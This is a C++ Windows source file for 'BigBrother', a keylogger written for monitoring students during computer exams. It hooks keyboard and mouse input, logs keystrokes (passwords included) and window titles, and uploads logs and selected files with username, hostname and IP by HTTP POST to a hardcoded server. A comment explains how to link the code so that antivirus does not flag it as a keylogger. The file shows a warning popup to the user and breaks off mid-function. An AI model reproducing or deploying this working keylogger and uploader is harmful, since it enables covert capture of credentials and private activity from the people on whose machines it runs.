/*
BigBrother
==========

This is an activity monitor (primarily a keylogger) which periodically sends reports/logs
to its server component (a python script; currently on impact.ijs.si) via HTTP. It was
written with the primary intent of monitoring students during exams taken on computers.

Keylogs contain:
 - keys pressed (including de-presses of alt, shift, ctrl)
 - mouse clicks and rightclicks
 - the active window title when it changes
 - heartbeat timestamps
In addition to keylogs, this program also monitors a selected set of files on hard drive
(specified via wildcard masks, see interestingMasks[] below) and periodically uploads 
those files if they change.

Keylog format:
Keylogs have a distinguishing filename (based on interestingMasks[0]). The syntax of
the files' contents is as follows:
	<keylog_contents> = <heartbeat><token>* (each keylog starts with a heartbeat timestamp)
	<token> = <keypress>|<special>
	<keypress> = single-character lowercase key representation (e.g. "x" or "4") or
		a key description enclosed in "<>", like "<backspace>", "<delete>", "<click>"
	<special> = "\xF0"<special_cmd>"\xF1" (0xF0 and 0xF1 hex is 360 and 361 octal)
	<special_cmd> = <heartbeat>|<window_title>|<modifier>
	<heartbeat> = "@<ts>" where <ts> is an integer timstamp (seconds since epoch)
	<window_title> = "T<title>" where <title> is the title of the active window
	<modifier> = "s+"|"s-"|"a+"|"a-"|"c+"|"c-" -- describes a press ("+") or 
		release ("-") of shift ("s"), alt ("a") or ctrl ("c")

Log rotation:
	Keypresses always get written into a file with a fixed filename (currently 
	c:/__KEYLOG.000000-000000.txt). Once the file gets too big or some time elapses,
	this file gets renamed (zeros are replaced by a YYMMDD-HHMMSS timestamp)
	and c:/__KEYLOG.000000-000000.txt is created anew.

Mitja, June 2009
*/

#define _CRT_SECURE_NO_WARNINGS

#include <stdlib.h>
#include <Winsock2.h> //must be included before windows.h; or use winsock.h
	// link with ws2_32.lib, not wsock32.lib, otherwise sophos antivirus suspects a keylogger
#include "windows.h"
#include <sys/stat.h>
#include <fstream>
#include <iostream>
#include <cstdio>
#include <string>
#include <vector>
#include <map>
#include <time.h>
#include <tlhelp32.h>
#include "urlencode.h"
#include "base64.h"

using namespace std;
//#using <mscorlib.dll>
//using namespace System;
//using namespace System::Threading;

// Files matching these masks will be monitored and uploaded to the server when they change.
// The first mask describes the directory where keylog files should be created; see also 
// createLogFilename(). 
// USE FORWARD SLASHES!
char* interestingMasks[50] = 
#ifdef _DEBUG
	{"c:/__KEYLOG.*.txt", "c:/python26/lib/di*.py", "D:/mitja/uvp/kol*.py", NULL};
#else
	{"u:/__KEYLOG.*.txt", NULL}; //"c:/python26/lib/di*.py", "D:/mitja/uvp/kol*.py", NULL};
#endif

// Maximum size for uploaded files, in bytes. Larger files get truncated.
#define MAX_UPLOAD_SIZE 50000

FILE *fLog; // keylog file
string currentLogFilename; // path to the current fLog
#ifdef _DEBUG
ofstream debugStream; // debug file
#endif

HHOOK kbHook, mouseHook;
KBDLLHOOKSTRUCT kbdStruct;
WCHAR outputChar;
WCHAR deadChar;
char keyBuf[200]; //keystrokes accumulator

// user's active window
char currentWindowTitle[200];
char lastWindowTitle[200];
// For monitored files (see interestingMasks[]).
// Maps filename -> last_modified timestamp of the file version that was last uploaded
map<string, time_t> uploadedVersion = map<string, time_t>();
// when did we last rotate the keylog file?
// (i.e. start using a new file so the old one can be uploaded)
time_t lastKeyLogRotate = 0;

// current process IDs
string pidStr;
string randomIdStr;

// multithreading synchronization
bool logFileInUse = false;


// utility functions -- defined at the end of file
char* scanCodeToStr(DWORD scancode);
int KILL_PROC_BY_NAME(const char *szToTerminate);
vector<pair<string, int> > listFiles(char *masks[]);
int sendPostRequest (char* hostname, char* api, char* parameters, string& message);
// other functions, as needed for visibility -- this should be in a .h file, really
int uploadFile(string filename, string content);
void rotateKeyLog();
string createLogFilename(time_t ts);



/*
Write the given string into keylog.
*/
void log(const char *msg) {
	while (logFileInUse) { /*busy wait, should be very short*/ }

	fprintf(fLog,"%s",msg);
	fflush(fLog);
	// upload log if it gets too big or at least once a minute
	if (ftell(fLog) > MAX_UPLOAD_SIZE/100 || (lastKeyLogRotate != 0 && time(0)-lastKeyLogRotate > 10000)) {
		rotateKeyLog();
	}
}

/*
Propose a new filename for a keylog file. This is constructed from the first
element of interestingMasks[] by replacing the asterisk with the current timestamp.
interestingMasks[0] MUST contain exactly one asterisk.
Input paramter: a time_t denoting the timestamp that should be used. The value of 0 
is reserved for the current (active) log file and results in a special filename. 
*/
string createLogFilename(time_t ts) {
	char timeStr[200];
	
	if (ts==0) {
		strcpy(timeStr, "000000-000000");
	} else {
		time_t rawtime = ts;
		struct tm * timeinfo;
		timeinfo = localtime (&rawtime);
		
		strftime(timeStr, 200, "%y%m%d-%H%M%S", timeinfo);
	}
	
	string ret = string(interestingMasks[0]);
	ret.replace(ret.find_first_of("*"), 1, timeStr);
	return ret;
}

/*
Safely create a new timestamped log file, copy the current contents into it, clean
the current logfile and start it with a heartbeat message. Does not upload 
the timestamped log file -- this will be done by uploadAttachments() eventually.
*/
void rotateKeyLog() {
	lastKeyLogRotate = time(0);

	logFileInUse = true;
	if (fLog != NULL) {
		fclose(fLog);
		string newLogFilename = createLogFilename(time(0));
		rename(currentLogFilename.c_str(), newLogFilename.c_str());
	}
	fLog = fopen(currentLogFilename.c_str(), "w");
	fprintf(fLog, "\360@%llu\361", time(0));
	logFileInUse = false;
}

/*
Returns the local IP address or "0.0.0.0" if an error occurs.
*/
string getLocalIp() {
   struct hostent *hostinfo;
   char name[255];
   char *svrAddr;

   if (gethostname (name, sizeof(name)) == 0) {
	   if((hostinfo = gethostbyname(name)) != NULL) {
		   svrAddr = _strdup (inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list));
		   return string(svrAddr);
	   } else {
		   return string("0.0.0.0");
	   }
   } else {
	   int err = WSAGetLastError();
	   return string("0.0.0.0");
   }
}


/*
Upload all "interesting" files (using HTTP POST to a predefined host).
Interesting files are determined by the interestingMasks[] global variable.
Only files that have changed since the last upload will be uploaded. This is 
tested simply by inspecting the last modified timestamp (no MD5 hashing or similar is used).
Only the first MAX_UPLOAD_SIZE bytes are uploaded.
*/
DWORD WINAPI _uploadAttachments(LPVOID ignoredParameter) {
	vector<pair<string, int> > fnames = listFiles(interestingMasks);
	for (unsigned int i=0; i<fnames.size(); i++) {
		string fn = fnames[i].first;
		int maskIdx = fnames[i].second;

		// the active keylog is an exception -- skip this one
		if (fn==currentLogFilename)
			continue;

		long fileSize;
		time_t lastModified;
		FILE *f = fopen(fn.c_str(), "r");
		// get file size
		fseek (f, 0, SEEK_END); fileSize = ftell(f); rewind(f);
		// get last modified timestamp
		struct _stat stats;
		_stat(fn.c_str(), &stats);
		lastModified = stats.st_mtime;

		if (uploadedVersion.find(fn) == uploadedVersion.end() || uploadedVersion[fn] != lastModified) {
			// read content; truncate after MAX_UPLOAD_SIZE bytes
			char content[MAX_UPLOAD_SIZE]; 
			int nBytes = fread(content, sizeof(char), MAX_UPLOAD_SIZE, f);
			fclose(f);
			string contentStr = string(content, nBytes);
			// mark truncated files. just the first condition should suffice,
			// but even for short files it is consistently true that nBytes==fileSize-7 ?!
			if (nBytes < fileSize && fileSize >= MAX_UPLOAD_SIZE) {
				char buf[300];
				sprintf(buf,"<<File too long (%d bytes); truncated at %d bytes>>", fileSize, nBytes);
				contentStr += buf;
			}
			int result = uploadFile(fn, contentStr);
			if (result==0) {
				if (maskIdx==0) {
					// if we just successfully uploaded a log file (= mask index 0 in 
					// the interestingFiles[] array) then delete the local file
					remove(fn.c_str());	
				} else {
					// for normal files, update the cache info
					uploadedVersion[fn] = lastModified; 
				}
			}
		} else {
			fclose(f);
		}
	}
	return 0;
}
/*
A thin wrapper that runs _uploadAttachments in a separate thread. This function is only 
invoked by a timer timeout, i.e. in a separate thread already, but it turns out that the
timer thread sohuld not be kept blocked for too long.
*/
VOID CALLBACK uploadAttachments(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
	CreateThread(NULL, 0, _uploadAttachments, NULL, 0, NULL);
}

/*
Send an HTTP POST request (to a hardcoded host).
Intended to be called in combination with CreateThread or timers; does not 
provide asynchronicity itself.
Parameter must be of type string* -- the whole data block of the request, already encoded etc.
Returns:
  0 on success,
  -1 if the server HTTP response was 200 OK, but the content body did not start with 'OK'
  -102 if the server HTTP response was not 200 OK,
  other negative value (see sendPostRequest()) if connection could not be estabilished
*/
DWORD WINAPI sendPostRequestSimple(LPVOID requestBody)
{
	string *request = (string*)requestBody;
	string response = string("POST failed"); // if POST succeeds this gets overwritten
	int result = sendPostRequest("impact.ijs.si", "/BigBrother/", (char*)request->c_str(), response); 
	//MessageBoxA(NULL,response.c_str(),"Odgovor POST",0);
	delete[] requestBody; 

	if (result==0 && response.find_first_of("OK") != 0) {
		//MessageBoxA(NULL,response.substr(0,100).c_str(),"Odgovor POST",0);
		return -1;
	} else {
		return result;
	}
}


/*
Upload (via HTTP POST) the given data; no asyncronicity is provided. Input parameter must be 
of type *upload_struct.
The following POST headers get sent:
filename=<filename of the uploaded file>
username=<current username on machine, url-encoded>
hostname=<current hostname, url-encoded>
pid=<current process id>.<random id assigned to the process at startup>
localtime=<local timestamp (seconds since epoch, integer value)>
content=<base64-encoded "content" parameter>
All values get url-encoded as they chould for POST.

Return value: 0 on success, nonzero otherwise (same as sendPostRequestSimple())
*/
int uploadFile(string filename, string content) {
	//Prepare all POST parameters
	char buf[200] = "N/A";
	// username
	DWORD bufsize = 200;
	GetUserNameA(buf, &bufsize); 
	string username = string(buf, bufsize);
	// hostname
	strcpy(buf, "N/A"); // in case gethostname fails
	gethostname(buf, 200);
	string hostname = string(buf);
	// time
	time_t now = time(0); //time_t == unsigned long long (%llu)
	sprintf(buf, "%llu", now);
	string nowStr = string(buf);
	// base64-encoded content
	string base64data = base64_encode((const unsigned char *)content.c_str(), content.length());

	//Pack all parameters together. Use strings to preserve null bytes.
	//String must be created on the heap because it will be used in another thread later.
	string *requestBody = new string("");
	*requestBody += \
		"padding1=padding_zaradi_cudnih_knjiznic_ki_dodajo_newline_v_prvi_keyname" + string("") + \
		"&filename=" + UrlEncodeString(filename) + \
		"&username=" + UrlEncodeString(username) + \
		"&hostname=" + UrlEncodeString(hostname) + \
		"&ip=" + getLocalIp() + \
		"&pid=" + pidStr + "." + randomIdStr + \
		"&localtime=" + UrlEncodeString(nowStr) + \
		"&content=" + UrlEncodeString(base64data) + \
		"&padding2=padding_zaradi_cudnih_knjiznic_ki_rezejo_zadnje_znake_request_stringa";

	int result = sendPostRequestSimple(requestBody);
	return result;
}

/*
Check if active window title has changed; if so, log the change.
*/
void logWindowTitle() {
	GetWindowTextA(GetForegroundWindow(), currentWindowTitle, 200);
	if (strcmp(currentWindowTitle, lastWindowTitle)!=0) {
		char buf[200];
		sprintf(buf, "\360T%s\361", currentWindowTitle);
		log(buf);
		strcpy(lastWindowTitle, currentWindowTitle);
	}
}

/*
Log current local time, keylogger PID and the random ID (assigned at startup).
Should be called periodically by a system timer.
*/
VOID CALLBACK logTime(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
	char buf[200];
	sprintf(buf, "\360@%llu\361", time(0));
	log(buf);
	logWindowTitle();
}


/*
Log keyboard presses.
*/
LRESULT CALLBACK InputHandler( int nCode, WPARAM wParam, LPARAM lParam ){
	if (nCode < 0)
	{
		return CallNextHookEx(kbHook,nCode,wParam,lParam);
	}

	logWindowTitle();
	kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
	bool isKeyExtended = (bool)((kbdStruct.flags >> LLKHF_EXTENDED) & 1);


	if (wParam==WM_KEYDOWN || wParam==WM_SYSKEYDOWN) {
		//sprintf(keyBuf, "%s [%d] [%d]", scanCodeToStr(kbdStruct.vkCode), kbdStruct.vkCode, kbdStruct.scanCode);
		sprintf(keyBuf, "%s", scanCodeToStr(kbdStruct.vkCode));
		log(keyBuf);
	} 
	if (kbdStruct.vkCode==160 || kbdStruct.vkCode==161) { //shift
		sprintf(keyBuf, "\360s%s\361", wParam==WM_KEYDOWN ? "+" : "-");
		log(keyBuf);
	}
	if (kbdStruct.vkCode==164 || kbdStruct.vkCode==165) { //alt
		sprintf(keyBuf, "\360a%s\361", wParam==WM_SYSKEYDOWN ? "+" : "-");
		log(keyBuf);
	}
	if (kbdStruct.vkCode==162 || kbdStruct.vkCode==163) { //ctrl
		sprintf(keyBuf, "\360c%s\361", wParam==WM_KEYDOWN ? "+" : "-");
		log(keyBuf);
	}

	return 0;
}

/*
Log mouse clicks and wheelscrolls.
*/
LRESULT CALLBACK MouseHandler( int nCode, WPARAM wParam, LPARAM lParam ){
	if (nCode < 0)
	{
		return CallNextHookEx(kbHook,nCode,wParam,lParam);
	}

	logWindowTitle();
	if (wParam==WM_LBUTTONDOWN) {
		log("<click>");
	} else if (wParam==WM_RBUTTONDOWN) {
		log("<rclick>");
	} else if (wParam==WM_RBUTTONDOWN) {
		log("<mswheel>");
	}
	return 0;
}


/*
Find all files matching any of the patterns given in the (NULL-terminated)
input array masks[]. Returns the list of all found files as pairs
of the form (full_file_path, index_of_mask_the_file_matched).
*/
vector<pair<string, int> > listFiles(char *masks[]) {
	vector<pair<string, int> > result = vector<pair<string, int> >();
	WIN32_FIND_DATA fileDesc;

	for(int cMask=0; masks[cMask]!=NULL; cMask++) {
		if (masks[cMask]==NULL) break;
		string maskPath = string(masks[cMask]);
		maskPath = maskPath.substr(0, maskPath.find_last_of('/'));
		HANDLE myHandle=FindFirstFile(masks[cMask],&fileDesc);

		while(1) {
			if(myHandle!=INVALID_HANDLE_VALUE)	{	
				// fileDesc.cFileName only contains the filename, no path
				string filePath = maskPath + "/" + fileDesc.cFileName;
				result.push_back(pair<string, int>(filePath, cMask));

				int ok = FindNextFile(myHandle,&fileDesc);
				if(ok==0 && GetLastError()==ERROR_NO_MORE_FILES)
					break;
			} else {
				break;
			}
		}
	}
	return result;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int nCmdShow)
{
	// Initialize global variables	
	currentLogFilename = createLogFilename(0);
	rotateKeyLog(); // sets up fLog, writes the intial heartbeat timestamp
	#ifdef _DEBUG
	debugStream.open("U:\\klg_debug.txt");
	#endif
	char buf[100];
	srand(time(0)%2000000011); sprintf(buf, "%d", rand());
	randomIdStr = string(buf);
	sprintf(buf, "%lu", GetCurrentProcessId());
	pidStr = string(buf);
	// Enable networking (sockets)
	WSADATA	WsaData;
	WSAStartup (0x0101, &WsaData);

	KILL_PROC_BY_NAME("BigBrother.exe"); // kill any other instances

	// --- TESTS --- this block is for debugging only
	getLocalIp();
	//vector<pair<string, int> > files = listFiles(interestingMasks);
	//for (int i=0; i<files.size(); i++) MessageBox(NULL, files[i].c_str(), "Opozorilo",MB_OK);
	//uploadFile("keylog", string("kaj žešèega dogaja kej model"));
	//uploadAttachments(NULL,0,0,0);
	
	kbHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)InputHandler, GetModuleHandle(NULL),0);
	mouseHook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)MouseHandler, GetModuleHandle(NULL),0);
	SetTimer(NULL, 0, 1000, logTime); // log the time every 1000 milliseconds
	SetTimer(NULL, 0, 10123, uploadAttachments); // upload changed files every 10 seconds
	// TODO(?) -- clipboard hooking:
	// http://msdn.microsoft.com/en-us/library/ms649016(VS.85).aspx#_win32_Adding_a_Window_to_the_Clipboard_Viewer_Chain

	MessageBox(NULL,"Vsak pritisk tipke bo zabelezen,\nvkljucno z morebitnimi vtipkanimi gesli in podobnim.","BigBrother - opozorilo",MB_OK);

	MSG message;
	while(GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	//UnhookWindowsHookEx(kbHook);
	fclose(fLog);
	return 0;
}








//------------------------ the final frontier. Copy-pasted utility functions below.








#define SEND_RQ(MSG) \
	/*debugStream << "REQUEST: " << MSG << endl;*/ \
	send(sock,MSG,strlen(MSG),0);
#ifdef _DEBUG
#define _DEBUG_PRINT(X) {debugStream << X; debugStream.flush();}
#else
#define _DEBUG_PRINT(X)
#endif

int sendPostRequest (char* hostname, char* api, char* parameters, string& message)
{

	WSADATA	WsaData;
	WSAStartup (0x0101, &WsaData);

    sockaddr_in       sin;
    int sock = socket (AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
		return -100;
	}
    sin.sin_family = AF_INET;
    sin.sin_port = htons( (unsigned short)80);

    struct hostent * host_addr = gethostbyname(hostname);
    if(host_addr==NULL) {
      _DEBUG_PRINT( "Unable to locate host"<<endl );
      return -103;
    }
    sin.sin_addr.s_addr = *((int*)*host_addr->h_addr_list) ;
    _DEBUG_PRINT( "Port :"<<sin.sin_port<<", Address : "<< sin.sin_addr.s_addr<<endl);

    if( connect (sock,(const struct sockaddr *)&sin, sizeof(sockaddr_in) ) == -1 ) {
     _DEBUG_PRINT( "connect failed"<<endl ) ;
     return -101;
    }

 string send_str;

 SEND_RQ("POST ");
 SEND_RQ(api);
 SEND_RQ(" HTTP/1.0\r\n");
 SEND_RQ("Accept: */*\r\n");
 SEND_RQ("User-Agent: Mozilla/4.0\r\n");

 char content_header[100];
 sprintf(content_header,"Content-Length: %d\r\n",strlen(parameters));
 SEND_RQ(content_header);
 SEND_RQ("Accept-Language: en-us\r\n");
 SEND_RQ("Accept-Encoding: gzip, deflate\r\n");
 SEND_RQ("Host: ");
 SEND_RQ("hostname");
 SEND_RQ("\r\n");
 SEND_RQ("Content-Type: application/x-www-form-urlencoded\r\n");
 SEND_RQ("\r\n");
 SEND_RQ("\r\n");
 SEND_RQ(parameters);
 SEND_RQ("\r\n");
 SEND_RQ("\r\n");

 _DEBUG_PRINT(cout<<"####HEADER####"<<endl);
 char c1[1];
 int l,line_length;
 bool loop = true;
 bool bHeader = false;

 while(loop) {
   l = recv(sock, c1, 1, 0);
   if(l<0) loop = false;
   if(c1[0]=='\n') {
       if(line_length == 0) loop = false;

       line_length = 0;
       if(message.find("200") != string::npos)
	       bHeader = true;

   }
   else if(c1[0]!='\r') line_length++;
   _DEBUG_PRINT( c1[0]);
   message += c1[0];
 }

 message="";
 if(bHeader) {

     _DEBUG_PRINT( "####BODY####"<<endl) ;
     char p[1024];
     while(true) {
		 int l = recv(sock,p,1023,0);
		 if (l <= 0) 
			 break;
	     p[l] = '\0';
	     message += p;
     }

     _DEBUG_PRINT(message);
 } else {
	 return -102;
 }

   WSACleanup( );

 return 0;
}







int KILL_PROC_BY_NAME(const char *szToTerminate)
// Terminate the process "szToTerminate" if it is currently running and is not this process
// This works for Win/95/98/ME and also Win/NT/2000/XP
// The process name is case-insensitive, i.e. "notepad.exe" and "NOTEPAD.EXE"
// will both work (for szToTerminate)
// Return codes are as follows:
//   0   = Process was successfully terminated
//   603 = Process was not currently running
//   604 = No permission to terminate process
//   605 = Unable to load PSAPI.DLL
//   602 = Unable to terminate process for some other reason
//   606 = Unable to identify system type
//   607 = Unsupported OS
//   632 = Invalid process name
//   700 = Unable to get procedure address from PSAPI.DLL
//   701 = Unable to get process list, EnumProcesses failed
//   702 = Unable to load KERNEL32.DLL
//   703 = Unable to get procedure address from KERNEL32.DLL
//   704 = CreateToolhelp32Snapshot failed
{
	BOOL bResult,bResultm;
	DWORD aiPID[1000],iCb=1000,iNumProc,iV2000=0;
	DWORD iCbneeded,i,iFound=0;
	char szName[MAX_PATH],szToTermUpper[MAX_PATH];
	HANDLE hProc,hSnapShot,hSnapShotm;
	OSVERSIONINFO osvi;
    HINSTANCE hInstLib;
	int iLen,iLenP,indx;
    HMODULE hMod;
	PROCESSENTRY32 procentry;      
	MODULEENTRY32 modentry;

	// Transfer Process name into "szToTermUpper" and
	// convert it to upper case
	iLenP=strlen(szToTerminate);
	if(iLenP<1 || iLenP>MAX_PATH) return 632;
	for(indx=0;indx<iLenP;indx++)
		szToTermUpper[indx]=toupper(szToTerminate[indx]);
	szToTermUpper[iLenP]=0;

     // PSAPI Function Pointers.
     BOOL (WINAPI *lpfEnumProcesses)( DWORD *, DWORD cb, DWORD * );
     BOOL (WINAPI *lpfEnumProcessModules)( HANDLE, HMODULE *,
        DWORD, LPDWORD );
     DWORD (WINAPI *lpfGetModuleBaseName)( HANDLE, HMODULE,
        LPTSTR, DWORD );

      // ToolHelp Function Pointers.
      HANDLE (WINAPI *lpfCreateToolhelp32Snapshot)(DWORD,DWORD) ;
      BOOL (WINAPI *lpfProcess32First)(HANDLE,LPPROCESSENTRY32) ;
      BOOL (WINAPI *lpfProcess32Next)(HANDLE,LPPROCESSENTRY32) ;
      BOOL (WINAPI *lpfModule32First)(HANDLE,LPMODULEENTRY32) ;
      BOOL (WINAPI *lpfModule32Next)(HANDLE,LPMODULEENTRY32) ;

	// First check what version of Windows we're in
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    bResult=GetVersionEx(&osvi);
	if(!bResult)     // Unable to identify system version
	    return 606;

	// At Present we only support Win/NT/2000/XP or Win/9x/ME
	if((osvi.dwPlatformId != VER_PLATFORM_WIN32_NT) &&
		(osvi.dwPlatformId != VER_PLATFORM_WIN32_WINDOWS))
		return 607;

    if(osvi.dwPlatformId==VER_PLATFORM_WIN32_NT)
	{
		// Win/NT or 2000 or XP

         // Load library and get the procedures explicitly. We do
         // this so that we don't have to worry about modules using
         // this code failing to load under Windows 9x, because
         // it can't resolve references to the PSAPI.DLL.
         hInstLib = LoadLibraryA("PSAPI.DLL");
         if(hInstLib == NULL)
            return 605;

         // Get procedure addresses.
         lpfEnumProcesses = (BOOL(WINAPI *)(DWORD *,DWORD,DWORD*))
            GetProcAddress( hInstLib, "EnumProcesses" ) ;
         lpfEnumProcessModules = (BOOL(WINAPI *)(HANDLE, HMODULE *,
            DWORD, LPDWORD)) GetProcAddress( hInstLib,
            "EnumProcessModules" ) ;
         lpfGetModuleBaseName =(DWORD (WINAPI *)(HANDLE, HMODULE,
            LPTSTR, DWORD )) GetProcAddress( hInstLib,
            "GetModuleBaseNameA" ) ;

         if(lpfEnumProcesses == NULL ||
            lpfEnumProcessModules == NULL ||
            lpfGetModuleBaseName == NULL)
            {
               FreeLibrary(hInstLib);
               return 700;
            }
		 
		bResult=lpfEnumProcesses(aiPID,iCb,&iCbneeded);
		if(!bResult)
		{
			// Unable to get process list, EnumProcesses failed
            FreeLibrary(hInstLib);
			return 701;
		}

		// How many processes are there?
		iNumProc=iCbneeded/sizeof(DWORD);

		// Get and match the name of each process
		for(i=0;i<iNumProc;i++)
		{
			// Get the (module) name for this process

	        strcpy(szName,"Unknown");
			// First, get a handle to the process
	        hProc=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,
				aiPID[i]);
	        // Now, get the process name and PID
			int pid=0;
	        if(hProc)
			{
               if(lpfEnumProcessModules(hProc,&hMod,sizeof(hMod),&iCbneeded) )
			   {
                  iLen=lpfGetModuleBaseName(hProc,hMod,szName,MAX_PATH);
			   }
			   pid = GetProcessId(hProc);
			}
	        CloseHandle(hProc);
			// We will match regardless of lower or upper case
#ifdef BORLANDC
            if(strcmp(strupr(szName),szToTermUpper)==0)
#else
			if(strcmp(_strupr(szName),szToTermUpper)==0 && pid!=GetCurrentProcessId())
#endif
			{
				// Process found, now terminate it
				iFound=1;
				// First open for termination
				hProc=OpenProcess(PROCESS_TERMINATE,FALSE,aiPID[i]);
				if(hProc)
				{
					if(TerminateProcess(hProc,0))
					{
						// process terminated
						CloseHandle(hProc);
                        FreeLibrary(hInstLib);
						return 0;
					}
					else
					{
						// Unable to terminate process
						CloseHandle(hProc);
                        FreeLibrary(hInstLib);
						return 602;
					}
				}
				else
				{
					// Unable to open process for termination
                    FreeLibrary(hInstLib);
					return 604;
				}
			}
		}
	}

	if(osvi.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)
	{
		// Win/95 or 98 or ME
			
		hInstLib = LoadLibraryA("Kernel32.DLL");
		if( hInstLib == NULL )
			return 702;

		// Get procedure addresses.
		// We are linking to these functions of Kernel32
		// explicitly, because otherwise a module using
		// this code would fail to load under Windows NT,
		// which does not have the Toolhelp32
		// functions in the Kernel 32.
		lpfCreateToolhelp32Snapshot=
			(HANDLE(WINAPI *)(DWORD,DWORD))
			GetProcAddress( hInstLib,
			"CreateToolhelp32Snapshot" ) ;
		lpfProcess32First=
			(BOOL(WINAPI *)(HANDLE,LPPROCESSENTRY32))
			GetProcAddress( hInstLib, "Process32First" ) ;
		lpfProcess32Next=
			(BOOL(WINAPI *)(HANDLE,LPPROCESSENTRY32))
			GetProcAddress( hInstLib, "Process32Next" ) ;
		lpfModule32First=
			(BOOL(WINAPI *)(HANDLE,LPMODULEENTRY32))
			GetProcAddress( hInstLib, "Module32First" ) ;
		lpfModule32Next=
			(BOOL(WINAPI *)(HANDLE,LPMODULEENTRY32))
			GetProcAddress( hInstLib, "Module32Next" ) ;
		if( lpfProcess32Next == NULL ||
			lpfProcess32First == NULL ||
		    lpfModule32Next == NULL ||
			lpfModule32First == NULL ||
			lpfCreateToolhelp32Snapshot == NULL )
		{
			FreeLibrary(hInstLib);
			return 703;
		}
			
		// The Process32.. and Module32.. routines return names in all uppercase

		// Get a handle to a Toolhelp snapshot of all the systems processes.

		hSnapShot = lpfCreateToolhelp32Snapshot(
			TH32CS_SNAPPROCESS, 0 ) ;
		if( hSnapShot == INVALID_HANDLE_VALUE )
		{
			FreeLibrary(hInstLib);
			return 704;
		}
		
        // Get the first process' information.
        procentry.dwSize = sizeof(PROCESSENTRY32);
        bResult=lpfProcess32First(hSnapShot,&procentry);

        // While there are processes, keep looping and checking.
        while(bResult)
        {
		    // Get a handle to a Toolhelp snapshot of this process.
		    hSnapShotm = lpfCreateToolhelp32Snapshot(
			    TH32CS_SNAPMODULE, procentry.th32ProcessID) ;
		    if( hSnapShotm == INVALID_HANDLE_VALUE )
			{
				CloseHandle(hSnapShot);
			    FreeLibrary(hInstLib);
			    return 704;
			}
			// Get the module list for this process
			modentry.dwSize=sizeof(MODULEENTRY32);
			bResultm=lpfModule32First(hSnapShotm,&modentry);
			

			// While there are modules, keep looping and checking
			while(bResultm)
			{
		        if(strcmp(modentry.szModule,szToTermUpper)==0)
				{
				    // Process found, now terminate it
				    iFound=1;
				    // First open for termination
				    hProc=OpenProcess(PROCESS_TERMINATE,FALSE,procentry.th32ProcessID);
				    if(hProc)
					{
					    if(TerminateProcess(hProc,0))
						{
						    // process terminated
							CloseHandle(hSnapShotm);
							CloseHandle(hSnapShot);
							CloseHandle(hProc);
			                FreeLibrary(hInstLib);
						    return 0;
						}
					    else
						{
						    // Unable to terminate process
							CloseHandle(hSnapShotm);
							CloseHandle(hSnapShot);
							CloseHandle(hProc);
			                FreeLibrary(hInstLib);
						    return 602;
						}
					}
				    else
					{
					    // Unable to open process for termination
						CloseHandle(hSnapShotm);
						CloseHandle(hSnapShot);
			            FreeLibrary(hInstLib);
					    return 604;
					}
				}
				else
				{  // Look for next modules for this process
					modentry.dwSize=sizeof(MODULEENTRY32);
					bResultm=lpfModule32Next(hSnapShotm,&modentry);
				}
			}

			//Keep looking
			CloseHandle(hSnapShotm);
            procentry.dwSize = sizeof(PROCESSENTRY32);
            bResult = lpfProcess32Next(hSnapShot,&procentry);
        }
		CloseHandle(hSnapShot);
	}
	if(iFound==0)
	{
		FreeLibrary(hInstLib);
		return 603;
	}
	FreeLibrary(hInstLib);
	return 0;
}



char* scanCodeToStr(DWORD scancode)
{
	bool found=0;
	char *result;
	switch(scancode)
	{


		//non-alpha or letter
	case 8: result="<backspace>";
		break;

	case 9: result="<tab>";
		break;

	case 13: result="<enter>";
		break;

	case 19: result="<pause>";
		break;

	case 20: result="<capslock>";
		break;

	case 27: result="<esc>";
		break;

	case 32: result=" ";   //spacebar
		break;

	case 33: result="<pg-up>";
		break;

	case 34: result="<pg-dn>";
		break;

	case 35: result="<end>";
		break;

	case 36: result="<home>";
		break;

	case 37: result="<left>";
		break;

	case 38: result="<up>";
		break;

	case 39: result="<right>";
		break;

	case 40: result="<down>";
		break;

	case 44: result="<prnt-screen>";
		break;

	case 45: result="<insert>";
		break;

	case 46: result="<delete>";
		break;

	case 60: result="<";
		break;

	case 62: result=">";
		break;

	case 63: result="?";
		break;

	case 91: result="<win key>";
		break;

	case 93: result="<menu key>";
		break;

	case 95: result="<sleep key>";
		break;

	case 106: result="*";
		break;

	case 107: result="+";
		break;

	case 109: result="-";
		break;

	case 110: result=".";
		break;

	case 111: result="/";
		break;

	case 144: result="<num-lock>";
		break;

	case 145: result="<scroll-lock>";
		break;

	case 186: result=";";
		break;

	case 187: result="-";
		break;

	case 188: result=",";
		break;

	case 189: result="=";
		break;

	case 190: result=".";
		break;

	case 191: result="/";
		break;

	case 192: result="`";
		break;

	case 219: result="[";
		break;

	case 220: result="\\";
		break;

	case 221: result="]";
		break;

	case 222: result="\'";
		break;   

		//number-row (above keys, not keypad)

	case 48: result="0";
		break;

	case 49: result="1";
		break;

	case 50: result="2";
		break;

	case 51: result="3";
		break;

	case 52: result="4";
		break;

	case 53: result="5";
		break;

	case 54: result="6";
		break;

	case 55: result="7";
		break;

	case 56: result="8";
		break;

	case 57: result="9";
		break;

	default:

		if(scancode>=48&&scancode<=57)
		{
			result=" ";
			result[0]=char(scancode);
			found=1;
		}
		//48-57: 0-9

		//upper case alpha - see <SHIFT> and letter in log

		//lower case alpha

		if(scancode>=65&&scancode<=90)
		{
			if(scancode==14){
				result="<shift-in>";}

			if(scancode==65){
				result="a";}

			if(scancode==66){
				result="b";}

			if(scancode==67){
				result="c";}

			if(scancode==68){
				result="d";}

			if(scancode==69){
				result="e";}

			if(scancode==70){
				result="f";}

			if(scancode==71){
				result="g";}

			if(scancode==72){
				result="h";}

			if(scancode==73){
				result="i";}

			if(scancode==74){
				result="j";}

			if(scancode==75){
				result="k";}

			if(scancode==76){
				result="l";}

			if(scancode==77){
				result="m";}

			if(scancode==78){
